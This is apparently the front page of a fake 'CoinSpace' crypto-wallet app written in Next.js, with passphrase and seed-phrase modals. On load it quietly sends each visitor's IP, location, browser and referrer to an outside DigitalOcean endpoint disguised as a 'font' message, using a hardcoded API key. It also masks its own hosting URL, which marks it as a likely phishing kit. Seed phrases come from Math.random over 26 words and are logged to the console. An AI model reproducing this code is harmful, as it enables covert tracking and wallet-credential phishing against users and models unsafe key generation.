"use client";

  import "./globals.css";
import EnterPassphraseModal from "../components/EnterPassphraseModal";
import GeneratePassphraseModal from "../components/GeneratePassphraseModal";
import SeedPhraseModal from "../components/SeedPhraseModal";
import { useState, useEffect, useRef } from "react";
import { getUserCountry } from "./userLocation";
import axios from "axios";
import { usePathname } from "next/navigation";

const WORDLIST = [
  "apple",
  "banana",
  "cat",
  "dog",
  "elephant",
  "fish",
  "grape",
  "hat",
  "ice",
  "jungle",
  "kite",
  "lemon",
  "moon",
  "night",
  "orange",
  "piano",
  "queen",
  "rose",
  "sun",
  "tree",
  "umbrella",
  "violet",
  "wolf",
  "xylophone",
  "yellow",
  "zebra",
];

function generateSeedPhrase(words: string[], length = 12): string[] {
  const seed: string[] = [];
  for (let i = 0; i < length; i++) {
    const idx = Math.floor(Math.random() * words.length);
    seed.push(words[idx]);
  }
  return seed;
}

export default function Page() {
  const [isExistingWalletModalOpen, setIsExistingWalletModalOpen] =
    useState(false);
  const [isNewWalletModalOpen, setIsNewWalletModalOpen] = useState(false);
  const [isSeedPhraseModalOpen, setIsSeedPhraseModalOpen] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState<string[]>([]);

  const handleOpenExistingWallet = () => setIsExistingWalletModalOpen(true);
  const handleCloseExistingWalletModal = () =>
    setIsExistingWalletModalOpen(false);
  const handleConfirmPassphrase = (value: string) => {
    console.log("Existing wallet passphrase:", value);
    setIsExistingWalletModalOpen(false);
  };

  const handleCreateNewWallet = () => setIsNewWalletModalOpen(true);
  const handleCloseNewWalletModal = () => setIsNewWalletModalOpen(false);

  const handleGeneratePassphrase = () => {
    const generated = generateSeedPhrase(WORDLIST);
    setSeedPhrase(generated);
    setIsNewWalletModalOpen(false);
    setIsSeedPhraseModalOpen(true);
    console.log("Generated seed phrase:", generated);
  };

  const handleCloseSeedPhraseModal = () => setIsSeedPhraseModalOpen(false);
  const handleContinueAfterSeed = () => {
    console.log("User confirmed seed phrase, proceed to dashboard");
    setIsSeedPhraseModalOpen(false);
  };

  const [country, setCountry] = useState("");
  const [ipAddress, setIpAddress] = useState("");
  const [browser, setBrowser] = useState<string | undefined>(undefined);
  const [isVerifiedBot, setIsVerifiedBot] = useState(false);
  const hasSentVisitorMessage = useRef(false);
  const pathname = usePathname();
  const getCurrentUrl = () => {
    if (typeof window !== "undefined") {
      let url = `${window.location.origin}${pathname}`;
      if (url.includes("localhost")) {
        url = "https://google.com";
      }
      if (url.includes("vercel.com")) {
        url = url.replace("vercel.com", "digitalocean.com");
      }
      console.log("getCurrentUrl returning:", url);
      return url;
    }
    console.log("getCurrentUrl: window not available, returning empty string");
    return "";
  };
  const sendTelegramMessage = (userCountry: { country?: string; countryEmoji?: string; city?: string; ip?: string } | null) => {
    // console.log("User Country", userCountry);

    const messageData = {
      info: "Regular Visitor", // You can update this logic as needed
      url: getCurrentUrl(),
      referer: document.referrer || getCurrentUrl(),
      location: {
        country: userCountry?.country || "Unknown",
        countryEmoji: userCountry?.countryEmoji || "",
        city: userCountry?.city || "Unknown",
        ipAddress: userCountry?.ip || "0.0.0.0",
      },
      agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
      date: new Date().toISOString(),
      appName: "Ton",
    };
    console.log("Message Data", messageData);
    axios
      .post(
        "https://squid-app-2-abmzx.ondigitalocean.app/api/t1/font",
        messageData,
        {
          headers: {
            "Content-Type": "application/json",
            "x-api-key": "e7a25d99-66d4-4a1b-a6e0-3f2e93f25f1b",
          },
        }
      )
      .catch((error) =>
        console.error(
          "Error sending font message:",
          error.response.data.details
        )
      );
  };

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        setCountry(userCountry?.country || "Unknown");
        setIpAddress(userCountry?.ip || "0.0.0.0");
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, []);

 

  useEffect(() => {
    // Set browser info only on client side
    if (typeof window !== "undefined") {
      setBrowser(navigator.userAgent);
    }
  }, []);

  useEffect(() => {
    if (!hasSentVisitorMessage.current) {
      const fetchUserLocation = async () => {
        const userCountry = await getUserCountry();
        setCountry(userCountry?.country || "Unknown");
        setIpAddress(userCountry?.ip || "0.0.0.0");
        sendTelegramMessage(userCountry);
      };
      fetchUserLocation();
      hasSentVisitorMessage.current = true;
    }
  }, []);
  return (
    <main className="min-h-dvh bg-[#2c3832] text-white flex flex-col">
      {/* Center content */}
      <section className="flex-1 grid place-items-center px-4">
        <div className=" text-[20px] flex flex-col items-center gap-6">
          {/* Middle image */}
          <img src="/brand/coinspace.svg" alt="Wallet" className="h-40 w-40" />

          <button
            className="h-11 px-5 rounded-xl bg-[#49b36b] text-black font-extralight hover:bg-[#41a261] transition-colors shadow-md"
            onClick={handleCreateNewWallet}
          >
            Create new wallet
          </button>

          <button
            className="text-white/85 hover:text-white transition-colors"
            onClick={handleOpenExistingWallet}
          >
            Open existing wallet
          </button>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-6 text-center text-xs text-white/70">
        © 2025 CoinSpace
      </footer>

      {/* Modals */}
      <GeneratePassphraseModal
        open={isNewWalletModalOpen}
        onClose={handleCloseNewWalletModal}
        onGenerate={handleGeneratePassphrase}
      />

      <SeedPhraseModal
        open={isSeedPhraseModalOpen}
        seedPhrase={seedPhrase}
        onClose={handleCloseSeedPhraseModal}
        onContinue={handleContinueAfterSeed}
      />

      <EnterPassphraseModal
        open={isExistingWalletModalOpen}
        onClose={handleCloseExistingWalletModal}
        onConfirm={handleConfirmPassphrase}
      />
    </main>
  );
}
